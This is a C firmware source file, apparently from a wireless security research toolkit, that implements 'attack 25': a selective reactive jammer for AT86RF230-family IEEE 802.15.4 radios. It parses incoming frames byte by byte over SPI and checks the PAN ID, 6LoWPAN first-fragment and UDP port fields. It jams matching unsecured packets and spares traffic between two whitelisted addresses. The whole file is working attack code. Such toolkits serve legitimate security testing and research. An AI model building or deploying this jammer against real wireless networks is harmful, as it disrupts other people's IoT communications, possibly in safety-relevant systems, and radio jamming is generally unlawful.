/*
 * fw/attacks/attack_25.c - Attack function with ID 25
 *
 * Written 2022 by Dimitrios-Georgios Akestoridis
 * Copyright 2022 Dimitrios-Georgios Akestoridis
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 */

#include <stdbool.h>
#include <stdint.h>

#define F_CPU 8000000UL
#include <util/delay.h>

#include "at86rf230.h"
#include "spi.h"
#include "board.h"
#include "attack.h"


/*
 * Jam only 124-byte unsecured 6LoWPAN first fragments of a specified network
 * that use the specified UDP source and destination ports,
 * unless the MAC addresses correspond to
 * the specified extended addresses in either direction
 */
bool attack(void)
{
	uint8_t rx_byte = 0;
	uint8_t mac_dst_0 = 0;
	uint8_t mac_dst_1 = 0;
	uint8_t mac_dst_2 = 0;
	uint8_t mac_dst_3 = 0;
	uint8_t mac_dst_4 = 0;
	uint8_t mac_dst_5 = 0;
	uint8_t mac_dst_6 = 0;
	uint8_t mac_dst_7 = 0;
	uint8_t mac_src_0 = 0;
	uint8_t mac_src_1 = 0;
	uint8_t mac_src_2 = 0;
	uint8_t mac_src_3 = 0;
	uint8_t mac_src_4 = 0;
	uint8_t mac_src_5 = 0;
	uint8_t mac_src_6 = 0;
	uint8_t mac_src_7 = 0;

	/* Read the received packet as soon as possible */
	spi_begin();
	spi_io(AT86RF230_BUF_READ);

	/* Check the length of the received packet */
	if (spi_recv() != 124) {
		/* Ignore packets that are not 124 bytes in length */
		spi_end();
		return 1;
	}

	/* Check the 8 least-significant bits of the MAC Frame Control */
	_delay_us(32);
	rx_byte = spi_recv();
	if ((rx_byte & 0x07) != 0x01) {
		/* Ignore packets that are not MAC Data packets */
		spi_end();
		return 1;
	} else if (rx_byte & 0x08) {
		/* Ignore packets with MAC Security enabled */
		spi_end();
		return 1;
	} else if (!(rx_byte & 0x40)) {
		/* Ignore packets that do not compress the PAN ID */
		spi_end();
		return 1;
	}

	/* Check the 8 most-significant bits of the MAC Frame Control */
	_delay_us(32);
	rx_byte = spi_recv();
	if ((rx_byte & 0x30) != 0x10) {
		/*
		 * Ignore packets that do not use the
		 * IEEE 802.15.4-2006 frame version
		 */
		spi_end();
		return 1;
	} else if ((rx_byte & 0x0c) != 0x0c) {
		/*
		 * Ignore packets that do not use an extended address
		 * for the destination node on the MAC layer
		 */
		spi_end();
		return 1;
	} else if ((rx_byte & 0xc0) != 0xc0) {
		/*
		 * Ignore packets that do not use an extended address
		 * for the source node on the MAC layer
		 */
		spi_end();
		return 1;
	}

	/* Ignore the MAC sequence number */
	_delay_us(32);
	spi_recv();

	/* Check the destination PAN ID */
	_delay_us(32);
	if (spi_recv() != (PANID & 0xff)) {
		/*
		 * Ignore packets that are
		 * destined for a different network
		 */
		spi_end();
		return 1;
	}
	_delay_us(32);
	if (spi_recv() != ((PANID >> 8) & 0xff)) {
		/*
		 * Ignore packets that are
		 * destined for a different network
		 */
		spi_end();
		return 1;
	}

	/* Store the MAC destination address */
	_delay_us(32);
	mac_dst_0 = spi_recv();
	_delay_us(32);
	mac_dst_1 = spi_recv();
	_delay_us(32);
	mac_dst_2 = spi_recv();
	_delay_us(32);
	mac_dst_3 = spi_recv();
	_delay_us(32);
	mac_dst_4 = spi_recv();
	_delay_us(32);
	mac_dst_5 = spi_recv();
	_delay_us(32);
	mac_dst_6 = spi_recv();
	_delay_us(32);
	mac_dst_7 = spi_recv();

	/* Store the MAC source address */
	_delay_us(32);
	mac_src_0 = spi_recv();
	_delay_us(32);
	mac_src_1 = spi_recv();
	_delay_us(32);
	mac_src_2 = spi_recv();
	_delay_us(32);
	mac_src_3 = spi_recv();
	_delay_us(32);
	mac_src_4 = spi_recv();
	_delay_us(32);
	mac_src_5 = spi_recv();
	_delay_us(32);
	mac_src_6 = spi_recv();
	_delay_us(32);
	mac_src_7 = spi_recv();

	/* Make sure that it is a 6LoWPAN first fragment */
	_delay_us(32);
	if ((spi_recv() & 0xf8) != 0xc0) {
		/* Ignore packets with unexpected 6LoWPAN pattern values */
		spi_end();
		return 1;
	}

	/* Ignore the datagram size */
	_delay_us(32);
	spi_recv();

	/* Ignore the datagram tag */
	_delay_us(32);
	spi_recv();
	_delay_us(32);
	spi_recv();

	/* Check the IPHC header */
	_delay_us(32);
	rx_byte = spi_recv();
	if (rx_byte != 0x7f && rx_byte != 0x7e && rx_byte != 0x7d) {
		/* Ignore packets with unexpected IPHC field values */
		spi_end();
		return 1;
	}
	_delay_us(32);
	if (spi_recv() != 0x33) {
		/* Ignore packets with unexpected IPHC field values */
		spi_end();
		return 1;
	}

	/* Check the NHC UDP header */
	_delay_us(32);
	if (spi_recv() != 0xf0) {
		/* Ignore packets with unexpected NHC UDP field values */
		spi_end();
		return 1;
	}

	/* Check the source port */
	_delay_us(32);
	if (spi_recv() != ((UDPSRCPORT >> 8) & 0xff)) {
		/*
		 * Ignore packets that originated
		 * from a different port
		 */
		spi_end();
		return 1;
	}
	_delay_us(32);
	if (spi_recv() != (UDPSRCPORT & 0xff)) {
		/*
		 * Ignore packets that originated
		 * from a different port
		 */
		spi_end();
		return 1;
	}

	/* Check the destination port */
	_delay_us(32);
	if (spi_recv() != ((UDPDSTPORT >> 8) & 0xff)) {
		/*
		 * Ignore packets that are
		 * destined for a different port
		 */
		spi_end();
		return 1;
	}
	_delay_us(32);
	if (spi_recv() != (UDPDSTPORT & 0xff)) {
		/*
		 * Ignore packets that are
		 * destined for a different port
		 */
		spi_end();
		return 1;
	}

	/* Decide whether the packet should be jammed or not */
	if (
		(
			mac_src_0 == (EXTENDEDSRCADDR & 0xff)
			&& mac_src_1 == ((EXTENDEDSRCADDR >> 8) & 0xff)
			&& mac_src_2 == ((EXTENDEDSRCADDR >> 16) & 0xff)
			&& mac_src_3 == ((EXTENDEDSRCADDR >> 24) & 0xff)
			&& mac_src_4 == ((EXTENDEDSRCADDR >> 32) & 0xff)
			&& mac_src_5 == ((EXTENDEDSRCADDR >> 40) & 0xff)
			&& mac_src_6 == ((EXTENDEDSRCADDR >> 48) & 0xff)
			&& mac_src_7 == ((EXTENDEDSRCADDR >> 56) & 0xff)
			&& mac_dst_0 == (EXTENDEDDSTADDR & 0xff)
			&& mac_dst_1 == ((EXTENDEDDSTADDR >> 8) & 0xff)
			&& mac_dst_2 == ((EXTENDEDDSTADDR >> 16) & 0xff)
			&& mac_dst_3 == ((EXTENDEDDSTADDR >> 24) & 0xff)
			&& mac_dst_4 == ((EXTENDEDDSTADDR >> 32) & 0xff)
			&& mac_dst_5 == ((EXTENDEDDSTADDR >> 40) & 0xff)
			&& mac_dst_6 == ((EXTENDEDDSTADDR >> 48) & 0xff)
			&& mac_dst_7 == ((EXTENDEDDSTADDR >> 56) & 0xff)
		)
		|| (
			mac_src_0 == (EXTENDEDDSTADDR & 0xff)
			&& mac_src_1 == ((EXTENDEDDSTADDR >> 8) & 0xff)
			&& mac_src_2 == ((EXTENDEDDSTADDR >> 16) & 0xff)
			&& mac_src_3 == ((EXTENDEDDSTADDR >> 24) & 0xff)
			&& mac_src_4 == ((EXTENDEDDSTADDR >> 32) & 0xff)
			&& mac_src_5 == ((EXTENDEDDSTADDR >> 40) & 0xff)
			&& mac_src_6 == ((EXTENDEDDSTADDR >> 48) & 0xff)
			&& mac_src_7 == ((EXTENDEDDSTADDR >> 56) & 0xff)
			&& mac_dst_0 == (EXTENDEDSRCADDR & 0xff)
			&& mac_dst_1 == ((EXTENDEDSRCADDR >> 8) & 0xff)
			&& mac_dst_2 == ((EXTENDEDSRCADDR >> 16) & 0xff)
			&& mac_dst_3 == ((EXTENDEDSRCADDR >> 24) & 0xff)
			&& mac_dst_4 == ((EXTENDEDSRCADDR >> 32) & 0xff)
			&& mac_dst_5 == ((EXTENDEDSRCADDR >> 40) & 0xff)
			&& mac_dst_6 == ((EXTENDEDSRCADDR >> 48) & 0xff)
			&& mac_dst_7 == ((EXTENDEDSRCADDR >> 56) & 0xff)
		)
	) {
		/*
		 * Ignore packets that are exchanged
		 * between the specified extended addresses
		 */
		spi_end();
		return 1;
	}

	/* Stop receiving and transition into the PLL_ON state */
	spi_end();
#if defined(AT86RF231) || defined(AT86RF212)
	reg_write(REG_TRX_STATE, TRX_CMD_FORCE_PLL_ON);
#elif defined(AT86RF230)
	reg_write(REG_TRX_STATE, TRX_CMD_PLL_ON);
#else
#error "Unknown transceiver"
#endif

	/* Jam the received packet */
	spi_begin();
	spi_send(AT86RF230_BUF_WRITE);
	spi_send(72);
	spi_end();

	/* Transition into the BUSY_TX state */
	slp_tr();

	/* Transition into the RX_ON state */
	change_state(TRX_CMD_RX_ON);

	return 1;
}
